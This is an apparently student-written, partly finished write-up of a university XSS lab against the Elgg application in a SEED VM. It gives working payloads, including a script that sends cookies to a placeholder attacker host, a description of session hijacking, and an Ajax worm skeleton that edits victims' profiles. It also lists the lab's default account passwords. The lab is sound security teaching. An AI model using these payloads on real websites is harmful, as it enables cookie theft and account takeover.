# CSUS CSC154: XSS Lab  

## Goal  
To fully demonstrate what attackers can do by exploiting XSS vulnerabilities.


## Lab Environment  
In this lab, we need three things, which are already installed in the provided `SEEDUbuntu12.04` VM image: (1) the Firefox web browser, (2) the Apache web server, and (3) the Elgg web application. For the browser, we need to use the LiveHTTPHeaders extension for Firefox to inspect the HTTP requests and responses. The pre-built Ubuntu VM image provided to you has already installed the Firefox web browser with the required extensions.  

The user accounts for Elgg are found below.  

| User          | UserName      | Password     |
| ------------- |:-------------:| ------------:|
| Admin         | admin         | seedelgg     |
| Alice         | alice         | seedalice    |
| Boby          | boby          | seedboby     |
| Charlie       | charlie       | seedcharlie  |
| Samy          | samy          | seedsamy     |



## Lab Tasks  

### Task 1: Posting a Malicious Message to Display an Alert Window  
The objective of this task is to embed a JavaScript program in our Elgg profile, such that when another
user views our profile, the JavaScript program will be executed and an alert window will be displayed. The
following JavaScript program will display an alert window:  

```javascript
<script>alert('xss');</script>
```

To accomplish this, we simply login as Samy, and navigate to edit our profile. As can be seen in Figure 1 below, we've placed our JavaScript payload in the "Brief Descriptoin" portion of Samy's profile.  
![1_1_samy](./writeup/images/1_1_samy.png)  
**Figure 1:** JavaScript alert window payload to demonstrate XSS.  

![1_2_samy](./writeup/images/1_2_samy.png)  
**Figure 2:** JavaScript alert window fires when Samy's profile is visited.  


### Task 2: Posting a Malicious Message to Display Cookies
The objective of this task is to embed a JavaScript program in our Elgg profile, such that when another user views our profile, the user's cookies will be displayed in the alert window. This can be done by adding some additional code to the JavaScript program in the previous task, more specifically `document.cookie` as such: 
```javascript
<script>alert(document.cookie);</script>
```

To accomplish this, we repeat the previous task, but replace the `'xss'` string, with `document.cookie`.



### Task 3: Stealing Cookies from the Victim’s Machine  
In the previous task, the malicious JavaScript code written by the attacker can print out the user’s cookies, but only the user can see the cookies, not the attacker. In this task, the attacker wants the JavaScript code to send the cookies to himself/herself. To achieve this, the malicious JavaScript code needs to send an HTTP request to the attacker, with the cookies appended to the request. We can do this by having the malicious JavaScript insert an `<img>` tag with its `src` attribute set to the attacker's machine. When the JavaScript inserts the img tag, the browser tries to load the image from the URL in the src field; this results in an HTTP GET request sent to the attacker’s machine. The JavaScript given below sends the cookies to the port 5555 of the attacker’s machine, where the attacker has a TCP server listening to the same port. The server can print out whatever it receives. The TCP server program is available from the lab's web site.  
```javascript
<script>
document.write('<img src=http://attacker_IP_address:5555?c='+ escape(document.cookie) + '>');
</script>
```


### Task 4: Session Hijacking using the Stolen Cookies  
After stealing the victim’s cookies, the attacker can do whatever the victim can do to the Elgg web server, including adding and deleting friends on behalf of the victim, deleting the victim’s post, etc. Essentially, the attacker has hijacked the victim’s session. In this task, we will launch this session hijacking attack, and write a program to add a friend on behalf of the victim. The attack should be launched from another virtual machine. To add a friend for the victim, we should first find out how a legitimate user adds a friend in Elgg. More specifically, we need to figure out what are sent to the server when a user adds a friend. Firefox's LiveHTTPHeaders extension can help us; it can display the contents of any HTTP request message sent from the browser. From the contents, we can identify all the parameters in the request. A screen shot of LiveHTTPHeaders is given in Figure Once we have understood what the HTTP request for adding friends look like, we can write a Java program to send out the same HTTP request. The Elgg server cannot distinguish whether the request is sent out by the user’s browser or by the attacker’s Java program. As long as we set all the parameters correctly, and the session cookie is attached, the server will accept and process the project-posting HTTP request. To simplify your task, we provide you with a sample Java program that does the following:

1. Open a connection to web server.  
2. Set the necessary HTTP header information.  
3. Send the request to web server.  
4. Get the response from web server.  

**Note 1:** Elgg uses two parameters elgg ts and elgg token as a countermeasure to defeat another related attack (Cross Site Request Forgery). Make sure that you set these parameters correctly for your attack to succeed.

**Note 2:** The attack should be launched from a different virtual machine; you should make the relevant changes to the attacker VM's `/etc/hosts` file, so your Elgg server's IP address points to the victim's machine's IP address, instead of the localhost (in our default setting).

### Task 5: Writing an XSS Worm  
In this and next task, we will perform an attack similar to what Samy did to MySpace in 2005 (i.e. the Samy Worm). First, we will write an XSS worm that does not self-propagate; in the next task, we will make it self-propagating. From the previous task, we have learned how to steal the cookies from the victim and then forge—from the attacker’s machine—HTTP requests using the stolen cookies. In this task, we need to write a malicious JavaScript program that forges HTTP requests directly from the victim’s browser, without the intervention of the attacker. The objective of the attack is to modify the victim’s profile and add Samy as a friend to the victim. We have already created a user called Samy on the Elgg server (the user name is samy).  

**Guideline 1:** Using Ajax. The malicious JavaScript should be able to send an HTTP request to the Elgg server, asking it to modify the current user’s profile. There are two common types of HTTP requests, one is HTTP GET request, and the other is HTTP POST request. These two types of HTTP requests differ in how they send the contents of the request to the server. In Elgg, the request for modifying profile uses HTTP POST request. We can use the XMLHttpRequest object to send HTTP GET and POST requests to web applications.

To learn how to use XMLHttpRequest, you can study these cited documents [1, 2]. If you are not familiar with JavaScript programming, we suggest that you read [3] to learn some basic JavaScript functions. You will have to use some of these functions.

**Guideline 2:** Code Skeleton. We provide a skeleton of the JavaScript code that you need to write. You need to fill in all the necessary details. When you store the final JavaScript code as a worm in the standalone file, you need to remove all the comments, extra space, new-line characters, `<script>` and `</script>`.

```javascript
<script>
var Ajax=null;
// Construct the header information for the HTTP request
Ajax=new XMLHttpRequest();
Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
// Construct the content. The format of the content can be learned
// from LiveHTTPHeaders.
var content="name=..&description=...&guid="; // You need to fill in the
details.
// Send the HTTP POST request.
Ajax.send(content);
</script>
```



### Task 6: Writing a Self-Propagating XSS Worm  

### Task 7: Countermeasures  















Login as samy

email: samy
password: seedsamy

place xss code in profile

```html
<script>alert('xss');</script>
```


do the cookie thing



login as charlie and watch the http headers for adding someone as a friend.

do that shit in javascript and then embed the code in someone elses profile after it done.
